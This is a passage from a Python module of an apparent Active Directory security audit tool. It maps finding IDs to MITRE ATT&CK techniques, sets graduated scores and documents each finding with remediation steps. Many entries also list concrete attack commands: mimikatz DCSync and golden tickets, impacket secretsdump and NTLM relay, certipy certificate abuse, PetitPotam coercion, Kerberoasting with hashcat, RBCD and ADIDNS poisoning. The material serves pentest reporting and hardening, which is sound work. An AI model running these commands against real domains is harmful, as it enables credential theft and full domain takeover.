    "A-WDigest": ["T1003.001: LSASS Memory"],
    "A-LMCompatibilityLevel": ["T1557: Adversary-in-the-Middle", "T1187: Forced Authentication"],
    "P-GPPPassword": ["T1552.006: Group Policy Preferences"],
    "A-LAPS-Not-Installed": ["T1078: Valid Accounts", "T1003: Credential Dumping"],
    "A-LocalAdminPassword": ["T1078: Valid Accounts"],
    "P-UnconstrainedDelegation": ["T1558: Steal/Forge Kerberos Tickets", "T1187: Forced Authentication"],
    "P-RBCD": ["T1558.003: Kerberos Delegation", "T1098: Account Manipulation"],
    "P-RBCD-Dangerous": ["T1098: Account Manipulation", "T1134.001: Token Impersonation"],
    "P-ConstrainedDelegService": ["T1558: Steal/Forge Kerberos Tickets"],
    "P-DelegationDCt2a4d": ["T1134.001: Token Impersonation/Theft"],
    "P-MachineAccountQuota": ["T1136: Create Account", "T1098: Account Manipulation"],
    "A-CertTempCustomSubject": ["T1649: Steal/Forge Authentication Certificates (ESC1)"],
    "A-CertTempAnyPurpose": ["T1649: Authentication Certificates (ESC2)"],
    "A-CertTempAgent": ["T1649: Authentication Certificates (ESC3)"],
    "A-CertTemplateESC4": ["T1649: Authentication Certificates (ESC4)", "T1222.001: ACL Modification"],
    "A-CertEnrollHttp": ["T1649: Authentication Certificates (ESC8)", "T1557: AiTM/Relay"],
    "A-CertROCA": ["T1649: Authentication Certificates"],
    "A-DC-Coerce": ["T1187: Forced Authentication", "T1557.001: LLMNR/NBT-NS+SMB Relay"],
    "A-DC-Spooler": ["T1187: Forced Authentication (PrinterBug)"],
    "A-DC-WebClient": ["T1187: Forced Authentication (WebClient)"],
    "A-LLMNR": ["T1557.001: LLMNR/NBT-NS Poisoning"],
    "A-NBTNSDisabled": ["T1557.001: LLMNR/NBT-NS Poisoning"],
    "A-DCLdapSign": ["T1557: Adversary-in-the-Middle (LDAP Relay)"],
    "A-DCLdapsChannelBinding": ["T1557: Adversary-in-the-Middle (LDAPS Relay)"],
    "A-LDAPSigningDisabled": ["T1557: Adversary-in-the-Middle (LDAP Relay)"],
    "A-SMB2SignatureNotRequired": ["T1557.001: SMB Relay"],
    "A-SMB2SignatureNotEnabled": ["T1557.001: SMB Relay"],
    "A-NullSession": ["T1087.002: Account Discovery (Domain)", "T1069.002: Permission Group Discovery"],
    "A-PreWin2000Anonymous": ["T1087.002: Account Discovery (Domain)"],
    "A-RestrictRemoteSAM": ["T1087.002: Account Discovery (Domain)"],
    "A-NTLMAudit": ["T1557: Adversary-in-the-Middle"],
    "S-SIDHistory": ["T1134.005: SID-History Injection"],
    "S-SIDHistoryPrivileged": ["T1134.005: SID-History Injection"],
    "T-SIDHistoryDangerous": ["T1134.005: SID-History Injection"],
    "T-SIDFiltering": ["T1134.005: SID-History Injection", "T1199: Trusted Relationship"],
    "T-TGTDelegation": ["T1199: Trusted Relationship", "T1550.003: Pass-the-Ticket"],
    "T-AzureADSSO": ["T1199: Trusted Relationship", "T1556: Modify Authentication Process"],
    "P-ServiceDomainAdmin": ["T1078: Valid Accounts", "T1558.003: Kerberoasting"],
    "A-MembershipEveryone": ["T1078: Valid Accounts", "T1098: Account Manipulation"],
    "P-ComputerInPrivGroup": ["T1078: Valid Accounts"],
    "P-ModifiableGPO": ["T1484.001: Group Policy Modification"],
    "P-DangerousACLGPO": ["T1484.001: Group Policy Modification"],
    "P-WriteToPrivGroup": ["T1098: Account Manipulation", "T1222.001: ACL Modification"],
    "P-DangerousExtendedRight": ["T1222.001: ACL Modification"],
    "P-AdminCountOrphan": ["T1078: Valid Accounts"],
    "A-BadSuccessor": ["T1098: Account Manipulation (dMSA)"],
    "A-DnsZoneAUCreateChild": ["T1557: Adversary-in-the-Middle (ADIDNS)", "T1584: Compromise Infrastructure"],
    "A-DnsZoneUpdate1": ["T1557: Adversary-in-the-Middle (ADIDNS)"],
    "A-WSUS-HTTP": ["T1195.002: Supply Chain Compromise", "T1557: AiTM"],
    "S-SMB-v1": ["T1210: Exploitation of Remote Services"],
    "S-Vuln-MS17_010": ["T1210: Exploitation of Remote Services (EternalBlue)"],
    "S-Vuln-MS14-068": ["T1558: Forge Kerberos Tickets (PAC)"],
    "P-DNSAdmin": ["T1574: Hijack Execution Flow (DLL)"],
    "A-DSRMLogon": ["T1556: Modify Authentication Process", "T1078.001: Default Accounts"],
    "P-RecoveryModeUnprotected": ["T1556: Modify Authentication Process"],
    "S-DesEnabled": ["T1558.003: Kerberoasting (DES)"],
    "A-AeA": ["T1558: Steal/Forge Kerberos Tickets"],
    "P-ExchangePrivEsc": ["T1222.001: ACL Modification", "T1098: Account Manipulation"],
}

# ── Graduated scoring: rule_id -> (points_per_affected, cap). When present, a
# rule's contribution scales with the number of affected objects up to the cap,
# scaling points with the number of affected objects. Falls back to flat points. ─
RULE_SCALE: Dict[str, Tuple[int, int]] = {
    "S-Inactive":        (1, 25),
    "S-C-Inactive":      (1, 25),
    "S-PwdNeverExpires": (1, 20),
    "S-PwdNotRequired":  (3, 30),
    "S-PwdLastSet-45":   (1, 15),
    "S-PwdLastSet-90":   (1, 20),
    "S-SIDHistory":      (2, 20),
    "S-AesNotEnabled":   (1, 15),
    "P-Kerberoasting":   (10, 50),
    "S-Kerberoastable":  (5, 40),
    "P-AdminNum":        (3, 40),
}

def scaled_points(rule_id: str, base_points: int, n_affected: int) -> int:
    """Return graduated points for a rule given how many objects it affects."""
    if rule_id in RULE_SCALE and n_affected > 0:
        per, cap = RULE_SCALE[rule_id]
        return max(base_points if n_affected else 0, min(cap, per * n_affected))
    return base_points

# ─────────────────────────────────────────────────────────────────────────────
# RULE DOCUMENTATION — pentester-focused detail surfaced in the report's
# per-finding expand panel. Keys = rule_id. Each entry may set:
#   description : One-sentence summary of what the finding represents.
#   why         : Why it matters from an attacker / defender perspective.
#   technical   : Attribute, registry key, ACE, or RFC reference.
#   exploit     : List of concrete commands / steps for exploitation.
#   remediation : List of concrete fix steps / commands.
#   refs        : List of reference URLs.
# Any field may be omitted; report falls back to the Finding.details string.
# ─────────────────────────────────────────────────────────────────────────────
RULE_DOCS: Dict[str, Dict[str, Any]] = {
    # ── Anomaly ────────────────────────────────────────────────────────────
    "A-Krbtgt": {
        "description": "The KRBTGT account password has not been rotated within the last 180 days.",
        "why": "Forged Kerberos tickets (Golden Tickets) signed with an old KRBTGT key remain valid until the next rotation. A single historical DC compromise grants persistent domain access.",
        "technical": "krbtgt pwdLastSet; rotation is recommended every 180 days, twice in succession (24h apart) to invalidate cached tickets.",
        "exploit": [
            "mimikatz \"lsadump::dcsync /domain:DOMAIN /user:krbtgt\"",
            "mimikatz \"kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:<NT-hash> /id:500 /ptt\"",
            "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain DOMAIN -spn cifs/dc.domain.local Administrator",
        ],
        "remediation": [
            "Download Microsoft's New-KrbtgtKeys.ps1 (Reset-KrbtgtKeyInteractiveWorkflow).",
            "Run reset, wait 24h for replication, run reset again.",
            "Schedule rotation at least every 180 days as policy.",
        ],
    },
    "A-LAPS-Not-Installed": {
        "description": "LAPS schema attributes (ms-Mcs-AdmPwd or msLAPS-Password) were not found.",
        "why": "Without LAPS, the local Administrator password is typically reused across endpoints. Capturing one machine's SAM yields lateral movement domain-wide.",
        "technical": "Check ms-Mcs-AdmPwd / msLAPS-Password / msLAPS-EncryptedPassword schema presence.",
        "exploit": [
            "After capturing one local-admin hash, pass-the-hash to all workstations: nxc smb <range> -u Administrator -H <NTLM>",
            "secretsdump.py -hashes :<NTLM> 'DOMAIN/Administrator@host'",
        ],
        "remediation": [
            "Deploy Microsoft LAPS (Windows LAPS shipped in Win11 22H2+, downloadable for older OS).",
            "Audit ACL on ms-Mcs-AdmPwd to grant Read only to defined help-desk groups.",
            "Set password policy: 14+ chars, all complexity, 30 day rotation.",
        ],
    },
    "A-LAPS-Joined-Computers": {
        "description": "Enabled workstation/server objects have no LAPS expiration recorded.",
        "why": "Machines whose ms-Mcs-AdmPwdExpirationTime is empty either never received the LAPS GPO or the LAPS client is broken — they likely still share a static local-admin password with the rest of the estate.",
        "technical": "ms-Mcs-AdmPwdExpirationTime / msLAPS-PasswordExpirationTime empty or 0.",
        "remediation": [
            "Ensure the LAPS GPO is linked and applied (gpresult /r).",
            "Verify LAPS CSE is installed on the affected hosts.",
            "Force-rotate by clearing ms-Mcs-AdmPwdExpirationTime on the computer object.",
        ],
    },
    "A-NullSession": {
        "description": "Anonymous LDAP bind can enumerate domain objects on this DC.",
        "why": "Allows fully unauthenticated user/computer/group enumeration — a recon goldmine and a prerequisite for many follow-on attacks (Kerberoast targeting, ASREP-roast, etc.).",
        "technical": "Anonymous bind succeeded and returned non-empty results for (objectClass=user).",
        "exploit": [
            "ldapsearch -x -H ldap://<dc> -b 'dc=domain,dc=local' '(objectClass=user)' sAMAccountName",
            "nxc ldap <dc> -u '' -p '' --users",
        ],
        "remediation": [
            "Set dsHeuristics 7th character to 0 (default — disable anonymous LDAP).",
            "Remove 'Authenticated Users' from 'Pre-Windows 2000 Compatible Access'.",
            "Block port 389 from non-trusted networks.",
        ],
    },
    "A-PreWin2000AuthenticatedUsers": {
        "description": "'Authenticated Users' is a member of 'Pre-Windows 2000 Compatible Access'.",
        "why": "Every domain user can read otherwise sensitive attributes (e.g., tokenGroupsGlobalAndUniversal) and can enumerate the domain in ways that are normally restricted. Many third-party scanners depend on this misconfig — but so do attackers.",
        "technical": "Group SID S-1-5-32-554 should contain only 'Authenticated Users' on demand-upgraded domains; remove on green-field deployments.",
        "exploit": [
            "ldeep ldap -d DOMAIN -u user -p pass -s ldap://<dc> all",
            "Enumerate password policy + tokenGroups without elevated rights",
        ],
        "remediation": [
            "Remove 'Authenticated Users' from Pre-Windows 2000 Compatible Access — only retain if a legitimate legacy app depends on it (rare in 2025).",
        ],
    },
    "A-PreWin2000Anonymous": {
        "description": "Anonymous / Everyone is a member of Pre-Windows 2000 Compatible Access.",
        "why": "Unauthenticated SAM lookups (LSARPC/SAMR) and partial LDAP enumeration become possible.",
        "remediation": [
            "net localgroup 'Pre-Windows 2000 Compatible Access' '<account>' /delete on the DC.",
        ],
    },
    "A-Guest": {
        "description": "The built-in Guest account is enabled.",
        "why": "Provides an unauthenticated authentication primitive that many tools (RPC, SMB, LDAP) implicitly trust.",
        "remediation": [
            "Disable Guest: net user Guest /active:no (on each DC).",
            "Audit Guest password (frequently blank).",
        ],
    },
    "A-MinPwdLen": {
        "description": "Domain minimum password length is below 8 characters.",
        "why": "Allows trivially-bruteforceable passwords. Combined with Kerberoasting / ASREP-roast yields offline cracking in minutes.",
        "technical": "domain object minPwdLength attribute.",
        "exploit": [
            "Use cracked Kerberoast/ASREP hashes against hashcat with -O -m 13100 / -m 18200.",
        ],
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 14",
            "Layer with PSO for service accounts (25+).",
        ],
    },
    "A-PwdComplexity": {
        "description": "Password complexity requirement is not enforced.",
        "why": "Single character-class passwords are trivial to spray and crack offline.",
        "technical": "pwdProperties bit 0 (DOMAIN_PASSWORD_COMPLEX) is clear.",
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -ComplexityEnabled $true",
        ],
    },
    "A-PwdHistory": {
        "description": "Password history length is below the recommended value (24).",
        "why": "Users can quickly cycle back to a previously-known password — minimising rotation's effectiveness against captured hashes.",
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -PasswordHistoryCount 24",
        ],
    },
    "A-PwdMaxAge": {
        "description": "Domain maxPwdAge is set to never (or > 2 years).",
        "why": "Captured hashes remain valid indefinitely. Even strong policies degrade quickly once a credential is breached.",
        "technical": "domain object maxPwdAge — a value of -9223372036854775808 (or any large negative number) means never-expire.",
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -MaxPasswordAge 365.00:00:00",
            "Pair with stronger min-length / passphrase guidance.",
        ],
    },
    "A-ReversiblePwd": {
        "description": "Enabled accounts have 'Store passwords using reversible encryption'.",
        "why": "Any DC-side credential dump (DCSync, ntdsutil) yields plaintext passwords for these accounts.",
        "exploit": [
            "mimikatz \"lsadump::dcsync /domain:DOMAIN /user:<account>\" — reads CLEAR_LOGON entries.",
            "impacket-secretsdump 'DOMAIN/user:pass@dc' -just-dc",
        ],
        "remediation": [
            "Set-ADUser <user> -AllowReversiblePasswordEncryption $false; then reset the password.",
        ],
    },
    "A-LMHashAuthorized": {
        "description": "LM-hash storage may still be active on the domain.",
        "why": "LM hashes can be brute-forced in minutes on commodity hardware (DES, 7-byte halves).",
        "remediation": [
            "Group Policy: Computer Config → Windows Settings → Local Policies → Security Options → 'Network security: Do not store LAN Manager hash value on next password change' = Enabled.",
            "Force password reset on every enabled account so the LM half is wiped from NTDS.dit.",
        ],
    },
    "A-DsHeuristicsAnonymous": {
        "description": "dsHeuristics 7th character is '2' — anonymous LDAP operations are enabled.",
        "why": "Anyone can query the directory without credentials.",
        "remediation": [
            "Clear position 7 in dsHeuristics on CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration.",
        ],
    },
    "A-DCLdapSign": {
        "description": "LDAP signing not enforced on the domain controller.",
        "why": "Permits NTLM relay onto LDAP (ntlmrelayx --remove-mic + LDAP relay) → arbitrary AD modifications.",
        "remediation": [
            "Set 'Domain controller: LDAP server signing requirements' = 'Require signing' via Default Domain Controllers GPO.",
        ],
    },
    "A-DCLdapsChannelBinding": {
        "description": "LDAPS channel binding (EPA) is not enabled.",
        "why": "Allows NTLM relay to LDAPS — pre-channel-binding fix (KB5005112).",
        "exploit": [
            "impacket-ntlmrelayx -t ldaps://<dc> --no-validate-privs",
        ],
        "remediation": [
            "Configure Domain controller: LDAP server channel binding token requirements = Always.",
            "Apply March 2024 LDAP channel-binding enforcement (KB5021130).",
        ],
    },
    "A-SMB2SignatureNotRequired": {
        "description": "SMB signing is not REQUIRED on the domain controller.",
        "why": "Enables SMB relay onto file/admin shares — historically PrintNightmare/PetitPotam pivots.",
        "exploit": [
            "impacket-ntlmrelayx -t smb://<target> -c 'whoami /priv'",
            "PetitPotam.py + ntlmrelayx --escalate-user user@domain",
        ],
        "remediation": [
            "Set 'Microsoft network server: Digitally sign communications (always)' = Enabled via DC Policy.",
        ],
    },
    "A-MembershipEveryone": {
        "description": "Everyone / Authenticated Users / Anonymous Logon are members of a privileged group.",
        "why": "Any logged-in user (potentially unauthenticated) inherits administrative power — domain-instant-pwn.",
        "remediation": [
            "Remove these well-known SIDs from the listed group immediately.",
        ],
    },
    "A-ProtectedUsers": {
        "description": "Privileged accounts are NOT members of Protected Users.",
        "why": "Without Protected Users, admin TGTs are long-lived, RC4 is allowed, and the credential delegation cache is reachable — Mimikatz dumps cleartext.",
        "remediation": [
            "Add-ADGroupMember -Identity 'Protected Users' -Members <admin>",
            "Note: Protected Users requires DFL ≥ 2012 R2 and breaks NTLM/digest for those accounts.",
        ],
    },
    "A-DnsZoneUpdate1": {
        "description": "DNS zone permits insecure dynamic updates.",
        "why": "Anyone (or any computer) can register DNS records → ADIDNS poisoning (wpad, etc.) → relay credentials.",
        "exploit": [
            "Invoke-DNSUpdate.ps1 -DNSType A -DNSName wpad -DNSData <attacker>",
            "krbrelayx dnstool.py -u DOMAIN\\user -p pass --action add --record wpad --data <attacker IP> <dc>",
        ],
        "remediation": [
            "Set the zone's update policy to 'Secure only' via DNS Manager.",
            "Remove broad ACEs from the dnsZone object's nTSecurityDescriptor.",
        ],
    },
    "A-DnsZoneAUCreateChild": {
        "description": "Authenticated Users can create dnsNode child objects in this AD-integrated zone.",
        "why": "Permits any domain user to add A/CNAME records → wpad/ADIDNS spoofing → NTLM relay.",
        "exploit": [
            "krbrelayx dnstool.py -u 'DOMAIN\\user' -p 'pass' --action add --record <wpad> --data <attacker-ip> <dc>",
        ],
        "remediation": [
            "Audit zone DACL; remove the CreateChild ACE for Authenticated Users.",
            "Enable the DnsAdmins-only secure-zone-update model where possible.",
        ],
    },
    "A-NoGPOLLMNR": {
        "description": "LLMNR is not disabled via Group Policy.",
        "why": "Responder picks up unresolved name queries on every client subnet, capturing NTLMv1/v2 challenge-responses.",
        "exploit": [
            "responder -I eth0 -wd",
            "ntlmrelayx + responder for relay-while-poisoning",
        ],
        "remediation": [
            "Computer Config → Admin Templates → Network → DNS Client → 'Turn off multicast name resolution' = Enabled.",
        ],
    },
    "A-WDigest": {
        "description": "WDigest UseLogonCredential is set to 1 — cleartext credentials cached in LSASS.",
        "why": "Mimikatz / Rubeus dump cleartext passwords trivially from memory.",
        "exploit": [
            "mimikatz \"sekurlsa::wdigest\"",
        ],
        "remediation": [
            "Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential=0 via GPO.",
        ],
    },
    "A-LMCompatibilityLevel": {
        "description": "LmCompatibilityLevel is below 3 — NTLMv1 is allowed.",
        "why": "NTLMv1 challenge-response can be cracked to NT hash via crack.sh; relays preserve hash material.",
        "exploit": [
            "Use Responder --lm to capture, then crack.sh or hashcat -m 5500.",
        ],
        "remediation": [
            "Set LmCompatibilityLevel = 5 ('Send NTLMv2 response only. Refuse LM & NTLM') via Default Domain GPO.",
        ],
    },
    "A-LLMNR": {
        "description": "LLMNR EnableMulticast is not 0 via GPO.",
        "why": "Same impact as A-NoGPOLLMNR — Responder credential capture.",
        "remediation": [
            "Apply GPO setting EnableMulticast=0 in HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient.",
        ],
    },
    "A-NBTNSDisabled": {
        "description": "NetBIOS-over-TCP/IP is not disabled — NodeType ≠ 2.",
        "why": "Allows NBT-NS poisoning (Responder -I), same impact as LLMNR.",
        "remediation": [
            "Set HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters\\NodeType = 2.",
            "Disable NetBIOS in NIC IPv4 advanced settings via GPO/DHCP option 1.",
        ],
    },
    "A-HardenedPaths": {
        "description": "UNC hardened paths for \\\\*\\SYSVOL and \\\\*\\NETLOGON are not configured.",
        "why": "MS15-011/MS15-014 bypass — attacker on path can serve malicious GPO/startup scripts.",
        "remediation": [
            "Computer Config → Admin Templates → Network → Network Provider → Hardened UNC Paths:",
            "  \\\\*\\SYSVOL = RequireMutualAuthentication=1, RequireIntegrity=1",
            "  \\\\*\\NETLOGON = RequireMutualAuthentication=1, RequireIntegrity=1",
        ],
    },
    "A-CredentialGuard": {
        "description": "Credential Guard (VBS LSA isolation) is not enforced via GPO.",
        "why": "Without CG, LSASS is readable by SYSTEM → Mimikatz extracts NT hashes / TGTs.",
        "remediation": [
            "Enable via GPO: Device Guard → Turn On Virtualization Based Security → Credential Guard Configuration = Enabled with UEFI lock.",
        ],
    },
    "A-WSUS-HTTP": {
        "description": "WSUS WUServer is HTTP (not HTTPS).",
        "why": "On-path attacker can inject signed-by-MS updates (no validation of channel) → SYSTEM on every patching client.",
        "exploit": [
            "WSUSpicious / SharpWSUS / wsuxploit — replace update with PsExec to add local admin.",
        ],
        "remediation": [
            "Reconfigure WSUS to use HTTPS (8531). Update WUServer/WUStatusServer GPO values to https://... and bind a trusted certificate to the WSUS site.",
        ],
    },
    "A-CertTempCustomSubject": {
        "description": "ESC1 — certificate template allows enrollee-supplied Subject and authentication EKU without manager approval.",
        "why": "Request a certificate for 'CN=Administrator' and PKINIT-authenticate as Domain Admin.",
        "exploit": [
            "certipy find -u user@domain -p pass -dc-ip <dc>",
            "certipy req -u user@domain -p pass -ca <CA> -template <tmpl> -upn administrator@domain",
            "certipy auth -pfx administrator.pfx",
        ],
        "remediation": [
            "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on the template (Properties → Subject Name → Build from this AD information).",
            "Or enforce manager approval / restrict the Enroll ACL to trusted groups only.",
        ],
    },
    "A-CertTempAnyPurpose": {
        "description": "ESC2 — template has Any Purpose EKU or no EKU restrictions and no manager approval.",
        "why": "Certificates from this template are valid for client authentication and code signing — chain to ESC3 for impersonation.",
        "remediation": [
            "Restrict EKU to required purposes (Client Authentication only for auth templates).",
            "Enable manager approval.",
        ],
    },
    "A-CertTempAgent": {
        "description": "ESC3 — Enrollment Agent template with no RA signature and no manager approval.",
        "why": "Enroll on behalf of any user without proof — typical chain: ESC3 → ESC2 → DA.",
        "exploit": [
            "certipy req -u user@domain -p pass -ca <CA> -template <agent-tmpl>",
            "certipy req -u user@domain -p pass -ca <CA> -template User -on-behalf-of 'DOMAIN\\Administrator' -pfx <agent.pfx>",
        ],
        "remediation": [
            "Require at least one RA signature on the template (msPKI-RA-Signature ≥ 1).",
            "Enable manager approval.",
        ],
    },
    "A-CertEnrollHttp": {
        "description": "ESC8 — ADCS enrollment service responds on HTTP without channel binding.",
        "why": "Relay coerced authentication (PetitPotam / DFSCoerce / PrinterBug) to /certsrv/certfnsh.asp to mint a DC certificate.",
        "exploit": [
            "impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
            "PetitPotam.py -u '' -p '' <attacker> <dc>",
            "certipy auth -pfx dc.pfx",
        ],
        "remediation": [
            "Disable HTTP on the CA web enrollment role.",
            "Require HTTPS + EPA: IIS → /certsrv → Authentication → Windows Auth → Advanced Settings → Extended Protection = Required.",
            "Apply KB5005413 and disable NTLM for ADCS endpoints.",
        ],
    },
    "A-CertROCA": {
        "description": "ROCA-affected RSA key in a domain certificate.",
        "why": "Infineon TPM RSA keypair generation flaw — private key derivable from public modulus (CVE-2017-15361).",
        "remediation": [
            "Re-issue affected certificates with a non-ROCA crypto provider; revoke originals.",
        ],
    },
    "A-BadSuccessor": {
        "description": "A dMSA has a 'preceded by' link to another account — allows the bad-successor escalation.",
        "why": "An attacker with edit rights on the dMSA can promote it to take over the predecessor's identity and keys (Akamai 2024 disclosure).",
        "exploit": [
            "Edit msDS-DelegatedManagedServiceAccountPrecededByLink → trigger key migration → impersonate.",
        ],
        "remediation": [
            "Audit and remove preceded-by links unless explicitly required.",
            "Tighten DACLs on dMSA objects.",
        ],
    },
    # ── Privileged ─────────────────────────────────────────────────────────
    "P-AdminNum": {
        "description": "Domain Admins group has more than 5 active members.",
        "why": "Each DA is a Tier-0 credential that can fully compromise the domain — keep the set minimal and audited.",
        "remediation": [
            "Reduce DA membership to break-glass accounts only. Use delegated roles for everyday ops.",
        ],
    },
    "P-Kerberoasting": {
        "description": "Privileged accounts have SPNs registered.",
        "why": "Any domain user can request a TGS for the SPN — RC4 tickets crack to plaintext offline. Privileged kerberoast = instant DA.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/lowpriv:pass -request -outputfile spn.hashes",
            "hashcat -m 13100 -O -a 0 spn.hashes rockyou.txt",
        ],
        "remediation": [
            "Move admins to gMSA where feasible — auto-rotated, AES-only.",
            "Set msDS-SupportedEncryptionTypes = 0x18 (AES128+AES256) on each account.",
            "Set 25+ char random passwords.",
        ],
    },
    "P-UnconstrainedDelegation": {
        "description": "Non-DC account has TRUSTED_FOR_DELEGATION (unconstrained Kerberos delegation).",
        "why": "Coerce any user/DC to authenticate to this host → cached TGT extractable from LSASS → impersonate anyone, including DA.",
        "exploit": [
            "Rubeus monitor /interval:1 /nowrap   (capture incoming TGTs)",
            "Coerce target: PetitPotam.py / SpoolSample / dfscoerce",
            "Rubeus asktgs /ticket:<base64> /service:cifs/<dc>",
        ],
        "remediation": [
            "Remove TRUSTED_FOR_DELEGATION flag (UAC bit 0x80000).",
            "Use Resource-Based Constrained Delegation or A2D2 instead.",
            "Add affected admins to Protected Users to block delegation of their TGTs.",
        ],
    },
    "P-ServiceDomainAdmin": {
        "description": "Service account (has SPN) is a member of Domain Admins.",
        "why": "Service accounts are the prime kerberoast target — DA-tier kerberoast cracks the keys to the kingdom.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/user:pass -request -target-user <svc-da>",
            "hashcat -m 13100 spn.hash wordlist",
        ],
        "remediation": [
            "Remove DA membership; grant only the specific rights the service needs.",
            "Convert to gMSA (automatic 30-day AES password rotation).",
        ],
    },
    "P-SchemaAdmin": {
        "description": "Schema Admins group is not empty.",
        "why": "Schema changes are irreversible. Active membership is a persistent backdoor opportunity.",
        "remediation": [
            "Empty Schema Admins after schema operations; add and remove only as needed.",
        ],
    },
    "P-Delegated": {
        "description": "Privileged accounts lack the 'Account is sensitive and cannot be delegated' flag.",
        "why": "Without ADS_UF_NOT_DELEGATED, these admins' TGTs can be forwarded by any service trusted for delegation — credential theft pivot.",
        "remediation": [
            "Set-ADUser <admin> -AccountNotDelegated $true",
            "Or add them to Protected Users (recommended) which implies non-delegation + AES-only.",
        ],
    },
    "P-DCSync": {
        "description": "A non-DC principal has DS-Replication-Get-Changes / -All rights on the domain root.",
        "why": "DCSync — replicates every secret in NTDS.dit. Effectively Domain Admin without group membership.",
        "exploit": [
            "impacket-secretsdump DOMAIN/user:pass@dc -just-dc",
            "mimikatz \"lsadump::dcsync /domain:DOMAIN /all /csv\"",
        ],
        "remediation": [
            "Remove the ACE: Get-Acl 'AD:\\<domain>' | filter for 'DS-Replication-Get-Changes*' GUIDs.",
            "Audit Exchange-related groups (Exchange Trusted Subsystem can inherit DCSync via PrivExchange).",
        ],
    },
    "P-ModifiableGPO": {
        "description": "A non-admin principal can edit a GPO that targets privileged scope.",
        "why": "Edit gPCFileSysPath scripts/registry → RCE on all linked objects on next gpupdate, including DCs.",
        "exploit": [
            "SharpGPOAbuse.exe --AddUserRights 'SeDebugPrivilege' --UserAccount <attacker>",
            "Add Computer Configuration startup script → executes on every linked host.",
        ],
        "remediation": [
            "Audit GPO DACL: Get-GPPermission -All -TargetName <gpo>.",
            "Remove write access from non-admin principals.",
        ],
    },
    "P-MachineAccountQuota": {
        "description": "ms-DS-MachineAccountQuota > 0 — any authenticated user may add up to N computer accounts.",
        "why": "Required primitive for RBCD (Resource-Based Constrained Delegation) and Shadow Credentials attacks → DA from low-priv.",
        "exploit": [
            "impacket-addcomputer -computer-name 'pwn$' -computer-pass 'P@ss' DOMAIN/user:pass",
            "rbcd.py -t <victim-host> -f 'pwn' -delegate-from 'pwn$' -action write DOMAIN/user:pass",
            "getST.py -spn cifs/<victim> -impersonate Administrator DOMAIN/pwn$:P@ss",
        ],
        "remediation": [
            "Set-ADDomain -MachineAccountQuota 0 — restrict computer creation to delegated admins.",
        ],
    },
    "P-GPPPassword": {
        "description": "Group Policy Preferences cpassword found in SYSVOL — MS14-025.",
        "why": "Microsoft published the AES key. Decrypt → credential reuse domain-wide.",
        "exploit": [
            "Gpp-Decrypt <cpassword> (Empire / SharpGPP / Get-GPPPassword.ps1).",
            "Test the recovered credential with nxc smb / kerbrute.",
        ],
        "remediation": [
            "Delete every SYSVOL XML containing cpassword (Groups.xml / Services.xml / ScheduledTasks.xml / DataSources.xml / Drives.xml / Printers.xml).",
            "Treat every affected account as compromised — reset password immediately.",
            "Use LAPS for local admin password management going forward.",
        ],
    },
    "P-ProtectedUsers": {
        "description": "Privileged accounts are not members of the Protected Users group.",
        "why": "Without Protected Users, admin Kerberos tickets default to 10h, RC4 is allowed, credentials are cached — Mimikatz fodder.",
        "remediation": [
            "Add admins to Protected Users (verify gMSA / interactive logon still works on legacy systems first).",
        ],
    },
    "P-RecycleBin": {
        "description": "AD Recycle Bin is not enabled.",
        "why": "Once enabled it cannot be disabled — attackers who can disable accounts force deletion to cover tracks.",
        "remediation": [
            "Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target <forest>",
        ],
    },
    # ── Stale ───────────────────────────────────────────────────────────────
    "S-Kerberoastable": {
        "description": "Service accounts with SPNs are missing AES encryption types.",
        "why": "Any user can request RC4-encrypted TGS tickets and crack offline.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/user:pass -request -outputfile spn.hashes",
            "hashcat -m 13100 -O spn.hashes rockyou.txt -r OneRuleToRuleThemAll.rule",
        ],
        "remediation": [
            "Set msDS-SupportedEncryptionTypes = 0x18 on each account (AES128 + AES256 only).",
            "Pair with strong (>25-char) passwords or convert to gMSA.",
        ],
    },
    "S-KerberoastableAdmin": {
        "description": "Kerberoastable accounts that are also members of a privileged group.",
        "why": "RC4 TGS for a Domain Admin = trivial offline crack → instant DA on success.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/lowuser:pass -request -target-user <admin-svc>",
            "hashcat -m 13100 -O hash.txt wordlist.txt",
        ],
        "remediation": [
            "URGENT — convert to gMSA or rotate the password to 25+ random chars TODAY.",
            "Set msDS-SupportedEncryptionTypes to 0x18 AES-only.",
        ],
    },
    "S-NoPreAuth": {
        "description": "Users have DONT_REQUIRE_PREAUTH (AS-REP roastable).",
        "why": "Request an AS-REP without proving knowledge of the password — the response contains a hash crackable offline (hashcat -m 18200).",
        "exploit": [
            "impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash",
            "hashcat -m 18200 -O asrep.hash rockyou.txt",
        ],
        "remediation": [
            "Clear DONT_REQUIRE_PREAUTH: Set-ADUser <user> -DoesNotRequirePreAuth $false",
        ],
    },
    "S-NoPreAuthAdmin": {
        "description": "Admin accounts have DONT_REQUIRE_PREAUTH — AS-REP roastable.",
        "why": "Same as S-NoPreAuth, but a successful crack equals a privileged credential.",
        "remediation": [
            "Disable the flag and reset the password to a long random value immediately.",
        ],
    },
    "S-PwdNotRequired": {
        "description": "Account is configured to permit logon with no password (PASSWD_NOTREQD).",
        "why": "Blank-password authentication is allowed on this account if the password is reset to empty.",
        "exploit": [
            "kerbrute passwordspray -d DOMAIN users.txt ''",
            "nxc smb <dc> -u <user> -p ''",
        ],
        "remediation": [
            "Set-ADUser <user> -PasswordNotRequired $false; force password reset.",
        ],
    },
    "S-PwdNeverExpires": {
